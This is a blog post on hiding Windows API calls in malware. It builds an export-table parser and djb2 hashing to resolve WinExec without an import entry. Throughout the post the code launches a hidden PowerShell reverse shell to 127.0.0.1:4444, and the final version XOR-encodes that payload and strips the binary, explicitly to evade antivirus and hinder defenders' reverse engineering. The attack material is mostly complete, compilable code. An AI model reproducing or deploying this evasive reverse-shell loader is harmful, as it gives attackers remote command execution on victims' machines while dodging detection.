<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Malware - Windows API hashing 1 | TRIKKSS Blog</title><meta name=keywords content="Reverse engineering,malware,C,Windows,PE,DLL"><meta name=description content="Windows API Hashing is a technique often used by malware developers to hide their calls to the windows API."><meta name=author content="TRIKKSS"><link rel=canonical href=https://trikkss.github.io/posts/hiding_windows_api_calls_part1/><link crossorigin=anonymous href=/assets/css/stylesheet.css rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.js onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://trikkss.github.io/img/pfp.png><link rel=icon type=image/png sizes=16x16 href=https://trikkss.github.io/img/pfp.png><link rel=icon type=image/png sizes=32x32 href=https://trikkss.github.io/img/pfp.png><link rel=apple-touch-icon href=https://trikkss.github.io/img/pfp.png><link rel=mask-icon href=https://trikkss.github.io/img/pfp.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="Malware - Windows API hashing 1"><meta property="og:description" content="Windows API Hashing is a technique often used by malware developers to hide their calls to the windows API."><meta property="og:type" content="article"><meta property="og:url" content="https://trikkss.github.io/posts/hiding_windows_api_calls_part1/"><meta property="og:image" content="https://trikkss.github.io/img/pfp.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-12-27T00:00:00+00:00"><meta property="article:modified_time" content="2022-12-27T00:00:00+00:00"><meta property="og:site_name" content="TRIKKSS Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://trikkss.github.io/img/pfp.png"><meta name=twitter:title content="Malware - Windows API hashing 1"><meta name=twitter:description content="Windows API Hashing is a technique often used by malware developers to hide their calls to the windows API."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://trikkss.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Malware - Windows API hashing 1","item":"https://trikkss.github.io/posts/hiding_windows_api_calls_part1/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Malware - Windows API hashing 1","name":"Malware - Windows API hashing 1","description":"Windows API Hashing is a technique often used by malware developers to hide their calls to the windows API.","keywords":["Reverse engineering","malware","C","Windows","PE","DLL"],"articleBody":"What is Windows API Hashing This technique is often used by malware developers to hide their calls to the windows API. That way the blue team will have more difficulty reversing the malware and it is less flagged by an AV. Our goal is to make a PE without an import table.\nThe Import Table Let’s compile a simple C program which will execute a simple reverse shell using WinExec API call. That call creates a new process and executes a system command.\n#include int main(void) { // execute our reverse shell WinExec(\"powershell -nop -c \\\"$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2\u003e\u00261 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '\u003e ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\\\"\", SW_HIDE); return 0; } Before the execution of our program, libraries will be loaded in memory and their function addresses will be referenced in the Import Address Table (IAT). When a program calls a function from a DLL, it calls the address located in the IAT wich points to the function in memory.\nIf we look into our import table (I used CFF Explorer to do it) we can see several imported DLLs and our suspicious function (WinExec).\nA first way will to hide our function would be to retrieve its address at runtime using the GetProcAddress() API call.\n#include typedef UINT(WINAPI* winexec)(LPCSTR lpCmdLine, UINT uCmdShow); int main(void) { // get handle of kernel32.dll HMODULE kernel32_dll = GetModuleHandle(\"kernel32.dll\"); // parse it to find the WinExec function winexec WinExec_imported = (winexec)GetProcAddress(kernel32_dll, \"WinExec\"); // execute our reverse shell WinExec_imported(\"powershell -nop -c \\\"$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2\u003e\u00261 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '\u003e ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\\\"\", SW_HIDE); return 0; } Here we retrieve the handle (the base address) of the kernel32.dll module with the GetModuleHandle() API call. Now we can use the GetProcAddress() API call to parse our DLL and return the function’s address.\nIt works, WinExec seems to be absent from our IAT. But until now it’s easy to reverse and functions like GetModuleHandle and GetProcAddress can be suspicious …\nWrite our own GetProcAddress We will write our own GetProcAddress() function and instead of searching for a function name, we will search for a hash. For now this may be strange for you but don’t worry you will understand everything. First we need to understand how the export table works.\nThe Export Table An Export Adress Table (EAT) will reference all the exported functions from a dll.\nThis is what the _IMAGE_EXPORT_DIRECTORY (wich represents the export table) structure defined into the winnt.h library looks like.\ntypedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; DWORD AddressOfNames; DWORD AddressOfNameOrdinals; } IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY; Name : the module name (dll name if you want) NumberOfFunctions : number of functions available in the module NumberOfNames : because some functions do not have names AddressOfFunctions : pointer to an array of address AddressOfNames : pointer to an array list of names AddressOfNameOrdinals : pointer to an array of “ordinals” (i will explain that.) diagram from Infosec Resources\nEach function has a number associated to it. It is called an ordinal. Each function name is associated to an ordinal but a function may have no name. Functions are often imported by their names but it makes a lot of strcmp so sometimes functions are imported by ordinal. It makes reverse engineering a bit harder and functions import faster.\nSo now, we can make a “roadmap” in order to create our own GetProcAdress():\nfirst, we must parse our dll to find the export table after we have to browse the name list to find our function name get ordinal associated to this name get address function associated to this ordinal and return it Parse the dll’s to do that we will use the winnt.h library in C.\nThe following diagram illustrates the simplified structure of a PE. more about PE format : Malware researcher’s handbook (demystifying PE file) | Infosec Resources\nSo, we have to parse the DOS header first, then the NT header to access the optionnal headers and finally get the Export Address Table (located in the .edata section)\n#include #include void* my_GetProcAddress(HMODULE dll_handle, char* hashed_function_name) { // a dll is a Portable Executable file. IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) dll_handle; // convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)dll_handle + p_DOS_HDR-\u003ee_lfanew ); // NT HEADERS are located at the raw offset defined in the e_lfanew header // RVA of the export table can be found in the optional headers // https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#optional-header-data-directories-image-only IMAGE_EXPORT_DIRECTORY* export_table = (IMAGE_EXPORT_DIRECTORY*)((LPBYTE)dll_handle + p_NT_HDR-\u003eOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); return NULL; } Now we have the address of our export table. Let’s parse it following the EAT diagram above.\nPARSE OUR EXPORT TABLE Getting the name, ordinal and address array.\nDWORD numberOfNames = export_table-\u003eNumberOfNames; // size of array name DWORD* functions_address = (DWORD*)((LPBYTE)dll_handle + export_table-\u003eAddressOfFunctions); // array function DWORD* functions_names = (DWORD*)((LPBYTE)dll_handle + export_table-\u003eAddressOfNames); // array name WORD* functions_ordinal = (WORD*)((LPBYTE)dll_handle + export_table-\u003eAddressOfNameOrdinals); // array ordinal let’s iterate through the array name to find our function\nfor(size_t i=0; i \u003c numberOfNames; i++) { char *name = (char*)dll_handle + functions_names[i]; if (strcmp(hashed_function_name, name) == 0) { printf(\"function %s found into %s !\\n\", name, (char*)dll_handle+export_table-\u003eName); } } This loop iterates through the name array and compares each function’s name to our string. Now we just have to return the function’s address, this is the tricky part. We have to find the ordinal attached to this function’s name.\n// these 2 arrays are parallel functions_names[i] // -\u003e name (string) functions_ordinal[i] // -\u003e ordinal (integer) // index of the function into the functions_address list // so we just have to do this to get the function functions_address[functions_ordinal[i]] don’t forget that these addresses are relative to the base address so we have to add base_address + address\nHere it’s the complete code of our function :\nvoid* my_GetProcAddress(HMODULE dll_handle, char* hashed_function_name) { IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) dll_handle; // convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)dll_handle + p_DOS_HDR-\u003ee_lfanew ); // NT HEADERS are located at the raw offset defined in the e_lfanew header IMAGE_EXPORT_DIRECTORY* export_table = (IMAGE_EXPORT_DIRECTORY*)((LPBYTE)dll_handle + p_NT_HDR-\u003eOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); // .edata section DWORD numberOfNames = export_table-\u003eNumberOfNames; printf(\"number of names : %d\\n\", numberOfNames); DWORD* functions_address = (DWORD*)((LPBYTE)dll_handle + export_table-\u003eAddressOfFunctions); DWORD* functions_names = (DWORD*)((LPBYTE)dll_handle + export_table-\u003eAddressOfNames); WORD* functions_ordinal = (WORD*)((LPBYTE)dll_handle + export_table-\u003eAddressOfNameOrdinals); for(size_t i=0; i \u003c numberOfNames; i++) { char *name = (char*)dll_handle + functions_names[i]; // printf(\"%s\\n\",name); if (strcmp(hashed_function_name, name) == 0) { printf(\"function %s found into %s !\\n\", name, (char*)dll_handle+export_table-\u003eName); return (LPBYTE)dll_handle + functions_address[functions_ordinal[i]]; } } return NULL; } Nice it works. Now we just have to “obfuscate” the name of our DLLs.\nAfter searching a bit on google I found the djb2 algorithm wich seems fast and interesting.\nunsigned long hash_djb2(unsigned char *str) { unsigned long hash = 5381; int c; while (c = *str++) hash = ((hash \u003c\u003c 5) + hash) + c; /* hash * 33 + c */ return hash; } If we call our hash fonction with “WinExec” argument we have this output :\nprintf(\"%lu\\n\", hash_djb2(\"WinExec\")); // output : 698766968 So our final function is :\nvoid* my_GetProcAddress(HMODULE dll_handle, unsigned long hashed_function_name) { IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) dll_handle; // convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)dll_handle + p_DOS_HDR-\u003ee_lfanew ); // NT HEADERS are located at the raw offset defined in the e_lfanew header IMAGE_EXPORT_DIRECTORY* export_table = (IMAGE_EXPORT_DIRECTORY*)((LPBYTE)dll_handle + p_NT_HDR-\u003eOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); // .edata section DWORD numberOfNames = export_table-\u003eNumberOfNames; DWORD* functions_address = (DWORD*)((LPBYTE)dll_handle + export_table-\u003eAddressOfFunctions); DWORD* functions_names = (DWORD*)((LPBYTE)dll_handle + export_table-\u003eAddressOfNames); WORD* functions_ordinal = (WORD*)((LPBYTE)dll_handle + export_table-\u003eAddressOfNameOrdinals); for(size_t i=0; i \u003c numberOfNames; i++) { char *name = (char*)dll_handle + functions_names[i]; // printf(\"%s\\n\",name); if (hashed_function_name == hash_djb2(name)) { return (LPBYTE)dll_handle + functions_address[functions_ordinal[i]]; } } return NULL; } and our final reverse shell looks like this :\n#include #include typedef UINT(WINAPI* winexec)(LPCSTR lpCmdLine, UINT uCmdShow); void* my_GetProcAddress(HMODULE dll_handle, unsigned long hashed_function_name); unsigned long hash_djb2(unsigned char *str); void xor(char* string, unsigned long key); int main(void) { // get handle of kernel32.dll unsigned long hash_function_name = 698766968; // char payload[] = \"powershell -nop -c \\\"$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2\u003e\u00261 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '\u003e ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\\\"\"; char payload[] = \"\\x09\\x18\\x10\\x1e\\x0b\\x0c\\x11\\x1e\\x15\\x15\\x59\\x56\\x17\\x18\\x09\\x59\\x56\\x1c\\x59\\x5b\\x5d\\x1c\\x15\\x12\\x1e\\x17\\x0d\\x59\\x46\\x59\\x37\\x1e\\x10\\x56\\x38\\x1b\\x13\\x1e\\x1c\\x0d\\x59\\x2c\\x02\\x0c\\x0d\\x1e\\x16\\x57\\x37\\x1e\\x0d\\x57\\x2c\\x18\\x1c\\x14\\x1e\\x0d\\x0c\\x57\\x2d\\x3c\\x29\\x3c\\x15\\x12\\x1e\\x17\\x0d\\x51\\x60\\x4a\\x4b\\x50\\x57\\x49\\x57\\x49\\x57\\x4a\\x60\\x55\\x4d\\x4d\\x4d\\x4d\\x52\\x44\\x5d\\x0c\\x59\\x46\\x59\\x5d\\x1c\\x15\\x12\\x1e\\x17\\x0d\\x57\\x40\\x1e\\x0d\\x2c\\x0d\\x0b\\x1e\\x1a\\x16\\x51\\x52\\x44\\x24\\x1b\\x02\\x0d\\x1e\\x24\\x26\\x26\\x5d\\x1b\\x59\\x46\\x59\\x49\\x57\\x57\\x4f\\x4e\\x4e\\x4c\\x4e\\x05\\x5e\\x04\\x49\\x06\\x44\\x10\\x11\\x12\\x15\\x1e\\x51\\x51\\x5d\\x12\\x59\\x46\\x59\\x5d\\x0c\\x57\\x2b\\x1e\\x1a\\x1d\\x51\\x5d\\x1b\\x55\\x59\\x49\\x55\\x59\\x5d\\x1b\\x57\\x35\\x1e\\x17\\x20\\x0d\\x11\\x52\\x52\\x59\\x56\\x17\\x1e\\x59\\x49\\x52\\x04\\x44\\x5d\\x1d\\x1a\\x0d\\x1a\\x59\\x46\\x59\\x51\\x37\\x1e\\x10\\x56\\x38\\x1b\\x13\\x1e\\x1c\\x0d\\x59\\x56\\x2d\\x02\\x09\\x1e\\x37\\x1a\\x16\\x1e\\x59\\x2c\\x02\\x0c\\x0d\\x1e\\x16\\x57\\x2d\\x1e\\x01\\x0d\\x57\\x3a\\x2c\\x3c\\x32\\x32\\x3e\\x17\\x1c\\x18\\x1d\\x12\\x17\\x20\\x52\\x57\\x40\\x1e\\x0d\\x2c\\x0d\\x0b\\x12\\x17\\x20\\x51\\x5d\\x1b\\x55\\x49\\x55\\x59\\x5d\\x12\\x52\\x44\\x5d\\x0c\\x1b\\x59\\x46\\x59\\x51\\x12\\x1e\\x01\\x59\\x5d\\x1d\\x1a\\x0d\\x1a\\x59\\x4b\\x47\\x5f\\x4a\\x59\\x05\\x59\\x38\\x0e\\x0d\\x56\\x2c\\x0d\\x0b\\x12\\x17\\x20\\x59\\x52\\x44\\x5d\\x0c\\x1b\\x4b\\x59\\x46\\x59\\x5d\\x0c\\x1b\\x59\\x54\\x59\\x60\\x29\\x2c\\x59\\x60\\x59\\x54\\x59\\x51\\x09\\x10\\x1d\\x52\\x57\\x29\\x1a\\x0d\\x11\\x59\\x54\\x59\\x60\\x47\\x59\\x60\\x44\\x5d\\x0c\\x1b\\x0d\\x59\\x46\\x59\\x51\\x24\\x0d\\x1e\\x01\\x0d\\x57\\x1e\\x17\\x1c\\x18\\x1d\\x12\\x17\\x20\\x26\\x43\\x43\\x3a\\x2c\\x3c\\x32\\x32\\x52\\x57\\x40\\x1e\\x0d\\x3b\\x02\\x0d\\x1e\\x0c\\x51\\x5d\\x0c\\x1b\\x4b\\x52\\x44\\x5d\\x0c\\x57\\x30\\x0b\\x12\\x0d\\x1e\\x51\\x5d\\x0c\\x1b\\x0d\\x55\\x49\\x55\\x5d\\x0c\\x1b\\x0d\\x57\\x35\\x1e\\x17\\x20\\x0d\\x11\\x52\\x44\\x5d\\x0c\\x57\\x3f\\x15\\x0e\\x0c\\x11\\x51\\x52\\x06\\x44\\x5d\\x1c\\x15\\x12\\x1e\\x17\\x0d\\x57\\x3c\\x15\\x18\\x0c\\x1e\\x51\\x52\\x5b\"; xor(payload, hash_function_name); HMODULE kernel32_dll = LoadLibrary(\"kernel32.dll\"); // parse it to find the WinExec function //winexec WinExec_imported = (winexec)GetProcAddress(kernel32_dll, \"WinExec\"); winexec WinExec_imported = (winexec)my_GetProcAddress(kernel32_dll, 698766968); WinExec_imported(payload, SW_HIDE); return 0; } void xor(char* string, unsigned long key) { while (*string) { *string -= 1; *string++ ^= (char)(key \u0026 0xff); } } void* my_GetProcAddress(HMODULE dll_handle, unsigned long hashed_function_name) { IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) dll_handle; // convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)dll_handle + p_DOS_HDR-\u003ee_lfanew ); // NT HEADERS are located at the raw offset defined in the e_lfanew header IMAGE_EXPORT_DIRECTORY* export_table = (IMAGE_EXPORT_DIRECTORY*)((LPBYTE)dll_handle + p_NT_HDR-\u003eOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); // .edata section DWORD numberOfNames = export_table-\u003eNumberOfNames; DWORD* functions_address = (DWORD*)((LPBYTE)dll_handle + export_table-\u003eAddressOfFunctions); DWORD* functions_names = (DWORD*)((LPBYTE)dll_handle + export_table-\u003eAddressOfNames); WORD* functions_ordinal = (WORD*)((LPBYTE)dll_handle + export_table-\u003eAddressOfNameOrdinals); for(size_t i=0; i \u003c numberOfNames; i++) { char *name = (char*)dll_handle + functions_names[i]; // printf(\"%s\\n\",name); if (hashed_function_name == hash_djb2(name)) { return (LPBYTE)dll_handle + functions_address[functions_ordinal[i]]; } } return NULL; } unsigned long hash_djb2(unsigned char *str) { unsigned long hash = 5381; int c; while (c = *str++) hash = ((hash \u003c\u003c 5) + hash) + c; /* hash * 33 + c */ return hash; } i changed my mind, instead of using GetModuleHandle() which just returns the base address only if a module is loaded in memory I used LoadLibrary() wich will load the library if it is not loaded and also return its handle.\nwe compile it :\ngcc reverse-shell.c -s -o reverse-shell.exe I just obfuscated a bit the powershell payload with a simple xor and compile it with the -s flag to strip our PE. Stripping a PE means to discard these debugging symbols (like the function name). Stripping a binary reduces its size on the disk and makes it a little more difficult to debug and reverse engineer.\nour main function now :\nand our own GetProcAddress is a bit hard to recognize (of course an experimented reverse engineer will recognize it easily):\nThe WinExec and GetProcAddress functions are now totally absent in the IAT.\nConclusion That’s all for this post, I hope you enjoyed it. If I said some things wrong or if I made any mistake feel free to report them to me. Same, if you don’t understand something contact me on Discord or Twitter. I will be happy to help you. Next time we will see how to make our own GetModuleHandle by parsing the Process Block Environment and make a PE without an import table.\n","wordCount":"1843","inLanguage":"en","datePublished":"2022-12-27T00:00:00Z","dateModified":"2022-12-27T00:00:00Z","author":{"@type":"Person","name":"TRIKKSS"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://trikkss.github.io/posts/hiding_windows_api_calls_part1/"},"publisher":{"@type":"Organization","name":"TRIKKSS Blog","logo":{"@type":"ImageObject","url":"https://trikkss.github.io/img/pfp.png"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://trikkss.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://trikkss.github.io/img/pfp.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://trikkss.github.io/posts/ title=Posts><span>Posts</span></a></li><li><a href=https://trikkss.github.io/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://trikkss.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://trikkss.github.io/posts/>Posts</a></div><h1 class=post-title>Malware - Windows API hashing 1</h1><div class=post-meta><span title='2022-12-27 00:00:00 +0000 UTC'>December 27, 2022</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;1843 words&nbsp;·&nbsp;TRIKKSS</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><ul><li><a href=#what-is-windows-api-hashing>What is Windows API Hashing</a></li><li><a href=#the-import-table>The Import Table</a></li><li><a href=#write-our-own-getprocaddress>Write our own GetProcAddress</a></li><li><a href=#the-export-table>The Export Table</a></li><li><a href=#parse-the-dlls>Parse the dll&rsquo;s</a></li><li><a href=#parse-our-export-table>PARSE OUR EXPORT TABLE</a></li><li><a href=#conclusion>Conclusion</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h3 id=what-is-windows-api-hashing>What is Windows API Hashing<a hidden class=anchor aria-hidden=true href=#what-is-windows-api-hashing>#</a></h3><p>This technique is often used by malware developers to hide their calls to the windows API. That way the blue team will have more difficulty reversing the malware and it is less flagged by an AV. Our goal is to make a PE without an import table.</p><h3 id=the-import-table>The Import Table<a hidden class=anchor aria-hidden=true href=#the-import-table>#</a></h3><p>Let&rsquo;s compile a simple C program which will execute a simple reverse shell using WinExec API call. That call creates a new process and executes a system command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;windows.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// execute our reverse shell
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>WinExec</span><span class=p>(</span><span class=s>&#34;powershell -nop -c </span><span class=se>\&#34;</span><span class=s>$client = New-Object System.Net.Sockets.TCPClient(&#39;127.0.0.1&#39;,4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2&gt;&amp;1 | Out-String );$sb2 = $sb + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()</span><span class=se>\&#34;</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>SW_HIDE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><img loading=lazy src=/img/posts/Windows_API_hashing-part1/IAT_schema.png alt="IAT schema"></p><p>Before the execution of our program, libraries will be loaded in memory and their function addresses will be referenced in the Import Address Table (IAT). When a program calls a function from a DLL, it calls the address located in the IAT wich points to the function in memory.</p><p>If we look into our import table (I used <a href="https://ntcore.com/?page_id=388">CFF Explorer</a> to do it) we can see several imported DLLs and our suspicious function (WinExec).</p><p><img loading=lazy src=/img/posts/Windows_API_hashing-part1/WinExec_IAT.png alt="win exec image"></p><p>A first way will to hide our function would be to retrieve its address at runtime using the GetProcAddress() API call.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;windows.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=nf>UINT</span><span class=p>(</span><span class=n>WINAPI</span><span class=o>*</span> <span class=n>winexec</span><span class=p>)(</span><span class=n>LPCSTR</span> <span class=n>lpCmdLine</span><span class=p>,</span> <span class=n>UINT</span> <span class=n>uCmdShow</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// get handle of kernel32.dll
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>HMODULE</span> <span class=n>kernel32_dll</span> <span class=o>=</span> <span class=nf>GetModuleHandle</span><span class=p>(</span><span class=s>&#34;kernel32.dll&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// parse it to find the WinExec function
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>winexec</span> <span class=n>WinExec_imported</span> <span class=o>=</span> <span class=p>(</span><span class=n>winexec</span><span class=p>)</span><span class=nf>GetProcAddress</span><span class=p>(</span><span class=n>kernel32_dll</span><span class=p>,</span> <span class=s>&#34;WinExec&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// execute our reverse shell
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>WinExec_imported</span><span class=p>(</span><span class=s>&#34;powershell -nop -c </span><span class=se>\&#34;</span><span class=s>$client = New-Object System.Net.Sockets.TCPClient(&#39;127.0.0.1&#39;,4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2&gt;&amp;1 | Out-String );$sb2 = $sb + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()</span><span class=se>\&#34;</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>SW_HIDE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Here we retrieve the handle (the base address) of the <code>kernel32.dll</code> module with the GetModuleHandle() API call. Now we can use the GetProcAddress() API call to parse our DLL and return the function&rsquo;s address.</p><p><img loading=lazy src=/img/posts/Windows_API_hashing-part1/IAT_no_WinExec.png alt="no WinExec"></p><p>It works, WinExec seems to be absent from our IAT. But until now it&rsquo;s easy to reverse and functions like GetModuleHandle and GetProcAddress can be suspicious &mldr;</p><p><img loading=lazy src=/img/posts/Windows_API_hashing-part1/ghidra_easy_reverse.png alt="ghidra reversing is ez"></p><h3 id=write-our-own-getprocaddress>Write our own GetProcAddress<a hidden class=anchor aria-hidden=true href=#write-our-own-getprocaddress>#</a></h3><p>We will write our own GetProcAddress() function and instead of searching for a function name, we will search for a hash. For now this may be strange for you but don&rsquo;t worry you will understand everything.
First we need to understand how the export table works.</p><h3 id=the-export-table>The Export Table<a hidden class=anchor aria-hidden=true href=#the-export-table>#</a></h3><p>An Export Adress Table (EAT) will reference all the exported functions from a dll.</p><p>This is what the _IMAGE_EXPORT_DIRECTORY (wich represents the export table) structure defined into the winnt.h library looks like.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>_IMAGE_EXPORT_DIRECTORY</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span>    <span class=n>Characteristics</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span>    <span class=n>TimeDateStamp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>WORD</span>    <span class=n>MajorVersion</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>WORD</span>    <span class=n>MinorVersion</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span>    <span class=n>Name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span>    <span class=n>Base</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span>    <span class=n>NumberOfFunctions</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span>    <span class=n>NumberOfNames</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span>    <span class=n>AddressOfFunctions</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span>    <span class=n>AddressOfNames</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span>    <span class=n>AddressOfNameOrdinals</span><span class=p>;</span>
